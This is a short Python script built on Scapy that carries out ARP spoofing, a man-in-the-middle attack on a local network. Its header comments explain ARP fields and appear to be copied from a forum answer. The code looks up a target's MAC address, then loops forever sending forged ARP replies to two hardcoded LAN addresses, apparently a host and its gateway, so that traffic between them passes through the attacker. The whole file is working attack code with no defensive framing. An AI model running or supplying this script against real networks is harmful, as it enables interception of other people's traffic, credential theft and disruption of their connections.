#! /usr/bin/env python3
#_*_ coding: utf8_*_

# NOTE: hwdst is the destination hardware address. If you are sending an ARP "who-has" request, you should just leave it to 0 (Scapy will do that by default). This field is used in "is-at" responses.
#Your command (srp(ARP(pdst=192.168.1.254, psrc=192.168.1.100, hwsrc="aa:aa:aa:aa:aa:aa"))) seems correct and should do what you want. Have you checked with Wireshark or Tcpdump how the packet you send looks like?
#If you have a look at the ARP page on Wikipedia, hwsrc is "Sender hardware address (SHA)", psrc is Sender protocol address (SPA), hwdst is "Target hardware address (THA)" and pdst is "Target protocol address (TPA)".

from scapy.all import *

def get_mac(ip):
    ip_layer = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast/ip_layer
    answer = srp(final_packet, timeout=2, verbose=False)[0]

    mac = answer[0][1].hwsrc
    return mac

def spoofer(target, spoofed):
    mac = get_mac(target)
    spoofer_mac = ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    send(spoofer_mac, verbose=False)

def main():
    try:
        print("[+] Corriendo [+]")
        while True:
            spoofer("192.168.100.4", "192.168.100.1")
            spoofer("192.168.100.1", "192.168.100.4")

    except KeyboardInterrupt:
        exit()



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
